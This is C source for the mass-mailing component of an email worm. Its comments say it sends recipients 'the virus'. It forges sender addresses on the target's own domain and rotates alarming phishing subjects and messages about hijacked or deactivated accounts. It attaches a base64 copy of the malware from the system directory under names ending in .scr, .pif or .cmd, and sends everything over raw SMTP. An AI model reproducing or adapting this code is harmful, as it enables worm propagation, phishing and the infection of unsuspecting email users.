/**************************************
* Purpose:
* Generates Email message and sends
* the recipient the virus
*
* TODO: Add in a mail queue. Chose random
* address from queue and pop it off
* and use it as from address
*
**************************************/

// if there is an error return true so we don't fuck up the massmailing
BOOL chk(int iStatus)
{
	if (iStatus!=SOCKET_ERROR && iStatus!=0)
	{
		return TRUE;
	}
	return FALSE;
}

char mail_1[64] = "", helokitty[64] = ""; //lol, meow! :=)
char bigbuff[4096],szLine[255],MessageBuffer[255];

//send the message buffer to the server we are connected to
void sendmsgbuff()
{
	if(!chk(send(hServer,MessageBuffer,strlen(MessageBuffer),0)))
		ErrorLevel = ERROR_LEVEL_SEND;
	
}
void recvbuff()
{
	if(!chk(recv(hServer,bigbuff,sizeof(bigbuff),0)))
		ErrorLevel = ERROR_LEVEL_RECEIVE;
	if (bigbuff[0]=='4' || bigbuff[0]=='5') ErrorLevel = ERROR_LEVEL_RECEIVE;
	
}

//gets the date from the local system then implements that as the date of when email was sent
void getdate(FILETIME *time, char *buf)
{
        SYSTEMTIME t;
	TIME_ZONE_INFORMATION tmz_info;
	DWORD daylight_flag; int utc_offs, utc_offs_u;
        LPSTR weekdays[7] = { "Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat" };
        LPSTR months[12] = { "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec" };

	if (time == NULL) {
	        GetLocalTime(&t);
	} else {
		FILETIME lft;
		FileTimeToLocalFileTime(time, &lft);
		FileTimeToSystemTime(&lft, &t);
	}

	tmz_info.Bias = 0;
	daylight_flag = GetTimeZoneInformation(&tmz_info);

	utc_offs = tmz_info.Bias;
	if (daylight_flag == TIME_ZONE_ID_DAYLIGHT) utc_offs += tmz_info.DaylightBias;
	utc_offs = -utc_offs;
	utc_offs_u = (utc_offs >= 0) ? utc_offs : -utc_offs;

        if (t.wDayOfWeek > 6) t.wDayOfWeek = 6;
        if (t.wMonth == 0) t.wMonth = 1;
        if (t.wMonth > 12) t.wMonth = 12;
static const char szDns[] = "%s %u %s %u.2u. %s";
        wsprintf(buf,
                "%s, %u %s %u %.2u:%.2u:%.2u %s%.2u%.2u",
                weekdays[t.wDayOfWeek], t.wDay,
                months[t.wMonth-1], t.wYear,
                t.wHour, t.wMinute, t.wSecond,
		(utc_offs >= 0) ? "+" : "-",
		utc_offs_u / 60, utc_offs_u % 60
        );
}




BOOL sendmail(LPSTR strTo)
{

	char syste[100];
	GetSystemDirectory(syste,sizeof(syste));
	srand(GetTickCount()); //Seeds random number generator
#define CRLF "\r\n"

char* szBuf2 = new char[76];

/////////////////////////////////////////////////
static const char *gen_names[] = {
  "server","administration", "managment", "service", "userhelp"
};


#define gen_names_cnt (sizeof(gen_names) / sizeof(gen_names[0]))

#define dmain 80
	char domain[dmain], *p;
	for (p=strTo; *p && *p != '@'; p++);
	if (*p++ != '@') return 0;
	lstrcpyn(domain, p, dmain-1);
char froms[255];
int i;
i = rand() % gen_names_cnt;
lstrcpy(froms, gen_names[i]);
	lstrcat(froms, "@");
	lstrcat(froms, domain);

////////////////////////////////////////////////
	char subject[200];
static const char *subjects[] = {
  "Urgent Update!", "Server Error", "User Info", "URGENT PLEASE READ!", "Detailed Information",
	  "User Information", "Email Account Information"
};
#define subjects_names (sizeof(subjects) / sizeof(subjects[0]))
int j;
j = rand() % subjects_names;
lstrcpy(subject, subjects[j]);



////////////////////////////////////////////////
char attachment[200];
static const char *attachments[] = {
  "Update","Details","Information", "Gift", "Word Document", "Account Information"
};

#define attachments_names (sizeof(attachments) / sizeof(attachments[0]))

int k;
k = rand() % attachments_names;
lstrcpy(attachment, attachments[k]);
///////////////////////////////////////////////

char message[200];
static const char *messages[] = {
  "There is urgent information in the attachment regarding your Email account",
	  "Your Email account information has been removed from the system due to inactivity. To renew your account information refer to the attachment",
	  "We regret to inform you that your account has been hijacked and used for illegal purposes. The attachment has more information about what has happened.", 
	  "Our Email system has received reports of your account flooding email servers. There is more information on this matter in the attachment", 
	  "Due to recent internet attacks, your Email account security is being upgraded. The attachment contains more details", 
	  "Our server is experiencing some latency in our email service. The attachment contains details on how your account will be affected."
};

#define message_names (sizeof(messages) / sizeof(messages[0]))


int l;
l = rand() % message_names;
lstrcpy(message, messages[l]);

////////////////////////////////////////////////
char extension[200];
static const char *extensions[] = {
  ".zip",".scr",".pif", ".cmd"
};

#define extensions_names (sizeof(extensions) / sizeof(extensions[0]))

int m;
m = rand() % extensions_names;
lstrcpy(extension, extensions[m]);
lstrcat(attachment,extension);
//printf(attachment); debugging purposes
////////////////////////////////////////////////
	

///////////////////////////////////////////////


if(strstr(attachment,".zip")) 
{
	
	strcat(syste,"\\base64zip.sys");
	//printf(syste); debug
}
else
{
	

strcat(syste,"\\base64exe.sys");
//printf(syste); even more debuggin
}

//////////////////////////////////////////////

/***************************************
* Standard Email bullshit sent to the server
* I had to read some tutorials on this
* Main part of the massmailing :P
***************************************/

//everytime you see sprintf(MessageBuffer,blah); it is just
// printing what ever arguements to the buffer then sends them to
// the recipient's server

	if (strlen(helokitty)>0) sprintf(MessageBuffer,"HELO <%s>%s",helokitty,CRLF);
	else sprintf(MessageBuffer,"HELO %s%s",domain,CRLF);
	sendmsgbuff(); recvbuff();

	if (strlen(mail_1)>0) sprintf(MessageBuffer,"MAIL FROM: <%s>%s",mail_1,CRLF);
	else sprintf(MessageBuffer,"MAIL FROM: <%s>%s",froms,CRLF);
	sendmsgbuff(); recvbuff();

	sprintf(MessageBuffer,"RCPT TO: <%s>%s",strTo,CRLF);
	sendmsgbuff(); recvbuff();
	sprintf(MessageBuffer,"DATA%s",CRLF);
	sendmsgbuff(); recvbuff();
char bufffer[MAX_PATH];
	getdate(NULL,bufffer);
	sprintf(MessageBuffer,"To: %s%s",strTo,CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"Subject: %s%s",subject,CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"Date: %s%s",bufffer,CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"From: %s%s",froms,CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"MIME-Version: 1.0%s",CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"Content-Type: multipart/mixed;" ,CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"boundary=\"--zzzxxxzzzxxx\"%s",CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"X-Priotity: 3%s",CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"X-MSMail-Priority: Normal%s",CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"%sThis is a multipart MIME-encoded message%s%s",CRLF,CRLF,CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"----zzzxxxzzzxxx%s",CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"Content-Type: text/html; charset=\"us-ascii\"%s",CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"Content-Transfer-Encoding: quoted-printable%s%s",CRLF,CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"%s",CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"%s%s",message,CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"----zzzxxxzzzxxx%s",CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"Content-Type: application/octet-stream; name=\"%s\"%s",attachment,CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"Content-Transfer-Encoding: base64%s",CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"Content-Disposition: attachment; filename=\"%s\"%s",attachment,CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"%s",CRLF); sendmsgbuff();
	FILE* file1;
	char szBuf[MAX_PATH];

	 char* strFile1 = new char[MAX_PATH];
	file1 = fopen(syste,"rb");
	if(file1==NULL)return 0;
	while(!feof(file1))
	{
		fscanf(file1,"%s\n",szBuf);
		sprintf(MessageBuffer,"%s%s",szBuf,CRLF);
		sendmsgbuff();
	}

	sprintf(MessageBuffer,"%s",CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"----zzzxxxzzzxxx--%s",CRLF); sendmsgbuff();
	sprintf(MessageBuffer,"%s.%s",CRLF,CRLF);
	sendmsgbuff(); recvbuff();
	sprintf(MessageBuffer,"QUIT%s",CRLF);
	sendmsgbuff(); recvbuff();
	closesocket(hServer);
	return TRUE;
}


